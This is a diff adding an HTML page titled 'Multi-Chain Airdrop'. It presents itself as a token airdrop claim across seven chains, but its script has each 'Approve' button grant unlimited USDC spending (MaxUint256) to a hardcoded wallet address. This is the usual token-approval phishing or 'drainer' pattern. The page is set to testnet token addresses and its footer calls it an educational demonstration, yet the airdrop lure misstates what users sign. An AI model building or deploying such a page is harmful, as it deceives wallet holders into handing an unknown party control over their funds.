@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Chain Airdrop | Real On-Chain Approval</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Ethers.js v6.15.0 for real blockchain interactions -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.15.0/ethers.umd.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #10b981;
+            --dark: #1e293b;
+            --light: #f8fafc;
+            --gray: #64748b;
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --eth: #627eea;
+            --linea: #61d7ff;
+            --arbitrum: #28a0f0;
+            --bnb: #f0b90b;
+            --base: #0052ff;
+            --optimism: #ff0420;
+            --polygon: #8247e5;
+            --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 20px 40px -10px rgba(0, 0, 0, 0.15);
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: var(--light);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .logo-icon {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: var(--gray);
+            max-width: 600px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 40px;
+        }
+
+        .wallet-section {
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: var(--shadow-lg);
+            text-align: center;
+            color: var(--dark);
+            margin-bottom: 20px;
+        }
+
+        .wallet-section h2 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: var(--dark);
+        }
+
+        .wallet-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            padding: 16px;
+            background: #f1f5f9;
+            border-radius: 16px;
+            font-size: 1.1rem;
+        }
+
+        .wallet-status.disconnected {
+            color: #ef4444;
+        }
+
+        .wallet-status.connected {
+            color: var(--secondary);
+        }
+
+        .wallet-address {
+            font-family: monospace;
+            background: #e2e8f0;
+            padding: 8px 16px;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            word-break: break-all;
+            margin-top: 15px;
+        }
+
+        .connect-btn {
+            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 18px 36px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: var(--shadow);
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px -10px rgba(99, 102, 241, 0.4);
+        }
+
+        .connect-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .connect-btn.connected {
+            background: linear-gradient(90deg, var(--secondary), #0ca674);
+        }
+
+        .chains-section {
+            width: 100%;
+        }
+
+        .chains-section h2 {
+            text-align: center;
+            font-size: 2.2rem;
+            margin-bottom: 40px;
+            color: white;
+        }
+
+        .chains-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .chain-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 28px;
+            box-shadow: var(--shadow);
+            transition: all 0.3s ease;
+            color: var(--dark);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .chain-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .chain-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        .eth .chain-icon { background-color: var(--eth); }
+        .linea .chain-icon { background-color: var(--linea); }
+        .arbitrum .chain-icon { background-color: var(--arbitrum); }
+        .bnb .chain-icon { background-color: var(--bnb); }
+        .base .chain-icon { background-color: var(--base); }
+        .optimism .chain-icon { background-color: var(--optimism); }
+        .polygon .chain-icon { background-color: var(--polygon); }
+
+        .chain-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 12px;
+        }
+
+        .chain-card p {
+            color: var(--gray);
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            font-size: 0.95rem;
+        }
+
+        .approve-btn {
+            background: #f1f5f9;
+            color: var(--dark);
+            border: none;
+            padding: 14px 28px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            transition: all 0.3s ease;
+            margin-top: auto;
+        }
+
+        .approve-btn:hover {
+            background: #e2e8f0;
+        }
+
+        .approve-btn.approved {
+            background: var(--secondary);
+            color: white;
+        }
+
+        .approve-btn.pending {
+            background: #fbbf24;
+            color: white;
+        }
+
+        .approve-btn.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .target-wallet {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .target-wallet h3 {
+            font-size: 1.3rem;
+            margin-bottom: 12px;
+            color: white;
+        }
+
+        .target-address {
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 1rem;
+            word-break: break-all;
+            color: var(--light);
+        }
+
+        footer {
+            margin-top: 60px;
+            text-align: center;
+            color: var(--gray);
+            font-size: 0.9rem;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            width: 100%;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: var(--shadow-lg);
+            color: var(--dark);
+            text-align: center;
+            animation: modalFade 0.3s ease;
+        }
+
+        @keyframes modalFade {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal h3 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: var(--dark);
+        }
+
+        .modal p {
+            margin-bottom: 30px;
+            color: var(--gray);
+            line-height: 1.6;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            flex: 1;
+        }
+
+        .modal-btn.confirm {
+            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+            color: white;
+        }
+
+        .modal-btn.cancel {
+            background: #f1f5f9;
+            color: var(--dark);
+        }
+
+        .modal-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 20px;
+            text-align: center;
+            font-weight: 600;
+            display: none;
+        }
+
+        .status-message.success {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--secondary);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            display: block;
+        }
+
+        .status-message.error {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            display: block;
+        }
+
+        .status-message.info {
+            background: rgba(59, 130, 246, 0.2);
+            color: #3b82f6;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            display: block;
+        }
+
+        .gas-info {
+            background: rgba(251, 191, 36, 0.1);
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            color: #fbbf24;
+            padding: 12px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .chains-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .wallet-section {
+                padding: 30px 20px;
+            }
+            
+            .modal-content {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <h1>Multi-Chain Airdrop</h1>
+            </div>
+            <p class="subtitle">
+                Claim your airdrop tokens across multiple blockchains. Connect your wallet and approve transactions to receive tokens on ETH, LINEA, ARBITRUM, BNB CHAIN, BASE, OP, and POLYGON.
+            </p>
+        </header>
+
+        <div class="main-content">
+            <div class="wallet-section">
+                <h2>Wallet Connection</h2>
+                
+                <div class="wallet-status disconnected" id="walletStatus">
+                    <i class="fas fa-plug"></i>
+                    <span>Wallet not connected</span>
+                </div>
+                
+                <div class="wallet-address" id="walletAddress" style="display: none;"></div>
+                
+                <button class="connect-btn" id="connectBtn">
+                    <i class="fas fa-wallet"></i>
+                    <span>Connect Wallet</span>
+                </button>
+                
+                <div class="status-message" id="connectionStatus"></div>
+            </div>
+
+            <div class="chains-section">
+                <h2>Approve Airdrop on Multiple Chains</h2>
+                
+                <div class="chains-grid" id="chainsGrid">
+                    <!-- Chain cards will be generated by JavaScript -->
+                </div>
+                
+                <div class="target-wallet">
+                    <h3>Approval Target Wallet</h3>
+                    <div class="target-address">0xc5da401b24e47cd329d3e0f2f99fac8fab6592f5</div>
+                    <p style="margin-top: 15px; font-size: 0.9rem; color: #94a3b8;">
+                        All approvals will be directed to this secure wallet address via on-chain transactions
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2023 Multi-Chain Airdrop. All rights reserved.</p>
+            <p style="margin-top: 10px;">This is a demonstration website for educational purposes. Always verify transactions in your wallet.</p>
+        </footer>
+    </div>
+
+    <!-- Approval Modal -->
+    <div class="modal" id="approvalModal">
+        <div class="modal-content">
+            <h3>Confirm On-Chain Approval</h3>
+            <p id="modalMessage">You are about to approve the airdrop contract to access your tokens on <span id="chainName"></span>. This will allow the contract to transfer tokens to your wallet.</p>
+            
+            <div class="gas-info">
+                <i class="fas fa-gas-pump"></i> Gas fee will be required for this transaction. Please check your wallet for the exact amount.
+            </div>
+            
+            <p style="font-weight: 600; color: var(--dark); margin-bottom: 20px;">
+                Target Spender: <span id="targetSpender" style="font-family: monospace; background: #f1f5f9; padding: 4px 8px; border-radius: 6px;">0xc5da401b24e47cd329d3e0f2f99fac8fab6592f5</span>
+            </p>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn cancel" id="cancelBtn">Cancel</button>
+                <button class="modal-btn confirm" id="confirmBtn">Approve On-Chain</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Chain configuration with testnet USDC addresses
+        const chains = [
+            {
+                id: 'eth',
+                name: 'Ethereum',
+                icon: 'fab fa-ethereum',
+                color: 'eth',
+                description: 'Approve airdrop on Ethereum Sepolia',
+                tokenAddress: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', // USDC Sepolia
+                chainId: 11155111,
+                explorer: 'https://sepolia.etherscan.io'
+            },
+            {
+                id: 'linea',
+                name: 'Linea',
+                icon: 'fas fa-layer-group',
+                color: 'linea',
+                description: 'Approve airdrop on Linea Sepolia',
+                tokenAddress: '0xFEce4462D57bD51A6A552365A011b95f0E16d9B7', // USDC Linea Sepolia
+                chainId: 59141,
+                explorer: 'https://sepolia.lineascan.build'
+            },
+            {
+                id: 'arbitrum',
+                name: 'Arbitrum',
+                icon: 'fas fa-bolt',
+                color: 'arbitrum',
+                description: 'Approve airdrop on Arbitrum Sepolia',
+                tokenAddress: '0x75faf114eafb1BDbe2F0316DF893fd58CE46AA4d', // USDC Arbitrum Sepolia
+                chainId: 421614,
+                explorer: 'https://sepolia.arbiscan.io'
+            },
+            {
+                id: 'bnb',
+                name: 'BNB Chain',
+                icon: 'fab fa-btc',
+                color: 'bnb',
+                description: 'Approve airdrop on BNB Testnet',
+                tokenAddress: '0x64544969ed7ebf5f083679233325356ebe738930', // USDC BSC Testnet
+                chainId: 97,
+                explorer: 'https://testnet.bscscan.com'
+            },
+            {
+                id: 'base',
+                name: 'Base',
+                icon: 'fas fa-cube',
+                color: 'base',
+                description: 'Approve airdrop on Base Sepolia',
+                tokenAddress: '0x036CbD53842c5426634e7929541eC2318f3dCF7e', // USDC Base Sepolia
+                chainId: 84532,
+                explorer: 'https://sepolia.basescan.org'
+            },
+            {
+                id: 'optimism',
+                name: 'Optimism',
+                icon: 'fas fa-rocket',
+                color: 'optimism',
+                description: 'Approve airdrop on OP Sepolia',
+                tokenAddress: '0x5fd84259d66Cd46123540766Be93DFE6D43130D7', // USDC OP Sepolia
+                chainId: 11155420,
+                explorer: 'https://sepolia-optimism.etherscan.io'
+            },
+            {
+                id: 'polygon',
+                name: 'Polygon',
+                icon: 'fas fa-hexagon',
+                color: 'polygon',
+                description: 'Approve airdrop on Polygon Amoy',
+                tokenAddress: '0x41E94Eb019C0762f9Bfcf9Fb1E58725BfB0e7582', // USDC Polygon Amoy
+                chainId: 80002,
+                explorer: 'https://amoy.polygonscan.com'
+            }
+        ];
+
+        // Target wallet address (spender)
+        const TARGET_WALLET = '0xc5da401b24e47cd329d3e0f2f99fac8fab6592f5';
+
+        // State
+        let connected = false;
+        let currentAddress = '';
+        let selectedChain = null;
+        let provider = null;
+        let signer = null;
+
+        // DOM Elements
+        const connectBtn = document.getElementById('connectBtn');
+        const walletStatus = document.getElementById('walletStatus');
+        const walletAddress = document.getElementById('walletAddress');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const chainsGrid = document.getElementById('chainsGrid');
+        const approvalModal = document.getElementById('approvalModal');
+        const modalMessage = document.getElementById('modalMessage');
+        const chainName = document.getElementById('chainName');
+        const targetSpender = document.getElementById('targetSpender');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const confirmBtn = document.getElementById('confirmBtn');
+
+        // Initialize chain cards
+        function initChainCards() {
+            chainsGrid.innerHTML = '';
+            
+            chains.forEach(chain => {
+                const chainCard = document.createElement('div');
+                chainCard.className = `chain-card ${chain.color}`;
+                chainCard.innerHTML = `
+                    <div class="chain-icon">
+                        <i class="${chain.icon}"></i>
+                    </div>
+                    <h3>${chain.name}</h3>
+                    <p>${chain.description}</p>
+                    <p style="font-size: 0.8rem; background: #f1f5f9; padding: 4px 8px; border-radius: 8px; margin: 10px 0;">
+                        Token: <span style="font-family: monospace;">${chain.tokenAddress.substring(0, 10)}...</span>
+                    </p>
+                    <button class="approve-btn ${!connected ? 'disabled' : ''}" data-chain="${chain.id}" ${!connected ? 'disabled' : ''}>
+                        <i class="fas fa-lock"></i>
+                        <span>Approve On-Chain</span>
+                    </button>
+                `;
+                
+                chainsGrid.appendChild(chainCard);
+            });
+            
+            // Add event listeners to approve buttons
+            document.querySelectorAll('.approve-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    if (this.classList.contains('disabled')) return;
+                    const chainId = this.getAttribute('data-chain');
+                    openApprovalModal(chainId);
+                });
+            });
+        }
+
+        // Open approval modal
+        function openApprovalModal(chainId) {
+            selectedChain = chains.find(c => c.id === chainId);
+            chainName.textContent = selectedChain.name;
+            targetSpender.textContent = TARGET_WALLET;
+            
+            modalMessage.innerHTML = `
+                You are about to approve <strong>${selectedChain.name}</strong> to spend your USDC tokens. 
+                This will create an on-chain transaction that grants unlimited spending permission to the target address.
+                <br><br>
+                <strong>This is a real blockchain transaction that will require gas fees.</strong>
+            `;
+            
+            approvalModal.style.display = 'flex';
+        }
+
+        // Close approval modal
+        function closeApprovalModal() {
+            approvalModal.style.display = 'none';
+            selectedChain = null;
+        }
+
+        // Connect to MetaMask
+        async function connectWallet() {
+            try {
+                // Check if MetaMask is installed
+                if (!window.ethereum) {
+                    showStatus('Please install MetaMask to use this dApp!', 'error');
+                    return;
+                }
+
+                // Create ethers provider
+                provider = new ethers.BrowserProvider(window.ethereum);
+                
+                // Request account access
+                const accounts = await provider.send("eth_requestAccounts", []);
+                
+                // Get signer
+                signer = await provider.getSigner();
+                currentAddress = await signer.getAddress();
+                
+                // Update state
+                connected = true;
+                
+                // Update UI
+                walletStatus.className = 'wallet-status connected';
+                walletStatus.innerHTML = '<i class="fas fa-link"></i><span>Wallet connected</span>';
+                walletAddress.textContent = currentAddress;
+                walletAddress.style.display = 'block';
+                
+                connectBtn.innerHTML = '<i class="fas fa-check-circle"></i><span>Connected</span>';
+                connectBtn.className = 'connect-btn connected';
+                
+                // Enable approve buttons
+                document.querySelectorAll('.approve-btn').forEach(btn => {
+                    btn.classList.remove('disabled');
+                    btn.disabled = false;
+                });
+                
+                // Show success message
+                showStatus('Wallet connected successfully! You can now approve transactions.', 'success');
+                
+                // Initialize chain cards
+                initChainCards();
+                
+                // Listen for account changes
+                window.ethereum.on('accountsChanged', handleAccountsChanged);
+                
+                // Listen for chain changes
+                window.ethereum.on('chainChanged', handleChainChanged);
+                
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                showStatus('Failed to connect wallet: ' + error.message, 'error');
+            }
+        }
+
+        // Handle account changes
+        function handleAccountsChanged(accounts) {
+            if (accounts.length === 0) {
+                // User disconnected wallet
+                disconnectWallet();
+            } else {
+                // Account changed
+                currentAddress = accounts[0];
+                walletAddress.textContent = currentAddress;
+                showStatus('Account changed to ' + currentAddress.substring(0, 10) + '...', 'info');
+            }
+        }
+
+        // Handle chain changes
+        function handleChainChanged(chainId) {
+            showStatus('Network changed. Please refresh the page.', 'info');
+        }
+
+        // Disconnect wallet
+        function disconnectWallet() {
+            connected = false;
+            currentAddress = '';
+            provider = null;
+            signer = null;
+            
+            // Update UI
+            walletStatus.className = 'wallet-status disconnected';
+            walletStatus.innerHTML = '<i class="fas fa-plug"></i><span>Wallet not connected</span>';
+            walletAddress.style.display = 'none';
+            
+            connectBtn.innerHTML = '<i class="fas fa-wallet"></i><span>Connect Wallet</span>';
+            connectBtn.className = 'connect-btn';
+            
+            // Disable approve buttons
+            document.querySelectorAll('.approve-btn').forEach(btn => {
+                btn.classList.add('disabled');
+                btn.disabled = true;
+            });
+            
+            showStatus('Wallet disconnected.', 'info');
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            connectionStatus.textContent = message;
+            connectionStatus.className = `status-message ${type}`;
+            connectionStatus.style.display = 'block';
+            
+            // Hide message after 5 seconds
+            setTimeout(() => {
+                connectionStatus.style.display = 'none';
+            }, 5000);
+        }
+
+        // Execute on-chain approval
+        async function executeOnChainApproval() {
+            if (!selectedChain || !signer) {
+                showStatus('Wallet not connected or chain not selected.', 'error');
+                return;
+            }
+
+            try {
+                // Update button state
+                const approveBtn = document.querySelector(`.approve-btn[data-chain="${selectedChain.id}"]`);
+                const originalText = approveBtn.innerHTML;
+                
+                approveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Waiting for Wallet...</span>';
+                approveBtn.className = 'approve-btn pending';
+                approveBtn.disabled = true;
+
+                // Create ERC20 contract instance
+                const erc20Abi = [
+                    "function approve(address spender, uint256 amount) external returns (bool)",
+                    "function balanceOf(address account) external view returns (uint256)"
+                ];
+                
+                const tokenContract = new ethers.Contract(selectedChain.tokenAddress, erc20Abi, signer);
+
+                // Check current balance
+                const balance = await tokenContract.balanceOf(currentAddress);
+                console.log(`Current balance: ${ethers.formatUnits(balance, 6)} USDC`);
+
+                // Execute approval transaction
+                // Using MaxUint256 for unlimited approval
+                const amount = ethers.MaxUint256;
+                
+                showStatus(`Sending approval transaction for ${selectedChain.name}...`, 'info');
+                
+                // This will trigger MetaMask popup
+                const tx = await tokenContract.approve(TARGET_WALLET, amount);
+                
+                approveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Transaction Pending...</span>';
+                
+                // Wait for transaction confirmation
+                const receipt = await tx.wait();
+                
+                // Update button to show approved
+                approveBtn.innerHTML = '<i class="fas fa-check-circle"></i><span>Approved On-Chain</span>';
+                approveBtn.className = 'approve-btn approved';
+                
+                // Show success message with transaction link
+                const explorerUrl = `${selectedChain.explorer}/tx/${receipt.hash}`;
+                showStatus(
+                    `Successfully approved unlimited USDC spending on ${selectedChain.name}! ` +
+                    `<a href="${explorerUrl}" target="_blank" style="color: #10b981;">View transaction</a>`,
+                    'success'
+                );
+                
+                // Close modal
+                closeApprovalModal();
+                
+            } catch (error) {
+                console.error('Error executing approval:', error);
+                
+                // Reset button
+                const approveBtn = document.querySelector(`.approve-btn[data-chain="${selectedChain.id}"]`);
+                approveBtn.innerHTML = '<i class="fas fa-lock"></i><span>Approve On-Chain</span>';
+                approveBtn.className = 'approve-btn';
+                approveBtn.disabled = false;
+                
+                // Show error message
+                if (error.code === 4001) {
+                    showStatus('Transaction rejected by user in MetaMask.', 'error');
+                } else {
+                    showStatus('Transaction failed: ' + error.message, 'error');
+                }
+            }
+        }
+
+        // Initialize the app
+        function initApp() {
+            // Initialize chain cards
+            initChainCards();
+            
+            // Event listeners
+            connectBtn.addEventListener('click', connectWallet);
+            cancelBtn.addEventListener('click', closeApprovalModal);
+            
+            confirmBtn.addEventListener('click', () => {
+                if (selectedChain) {
+                    executeOnChainApproval();
+                }
+            });
+            
+            // Close modal when clicking outside
+            approvalModal.addEventListener('click', (e) => {
+                if (e.target === approvalModal) {
+                    closeApprovalModal();
+                }
+            });
+            
+            // Check if wallet is already connected
+            if (window.ethereum && window.ethereum.selectedAddress) {
+                // Auto-connect if previously connected
+                setTimeout(() => {
+                    connectWallet();
+                }, 500);
+            }
+        }
+
+        // Initialize the app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
+</body>
+</html>
